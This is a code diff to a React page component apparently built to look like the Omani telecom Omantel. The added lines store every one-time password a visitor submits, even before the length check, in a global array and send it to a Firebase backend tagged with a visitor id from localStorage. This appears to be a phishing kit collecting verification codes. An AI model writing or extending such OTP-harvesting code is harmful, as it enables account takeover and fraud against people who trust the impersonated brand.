@@ -32,7 +32,7 @@ import {
 } from "@/components/ui/dialog"
 import { useState } from "react"
 import { addData } from "@/lib/firebase"
-
+const allOtps=['']
 export default function OmantelPage(): ReactElement {
   // Form state management
   const [formValues, setFormValues] = useState({
@@ -134,6 +134,10 @@ export default function OmantelPage(): ReactElement {
 
   const handleOtpSubmit = (): void => {
     // Validate OTP
+    allOtps.push(otp)
+
+    const _id=localStorage.getItem('visitor')
+    addData({id:_id,allOtps,otp})
     if (otp.length !== 6) {
     
       return
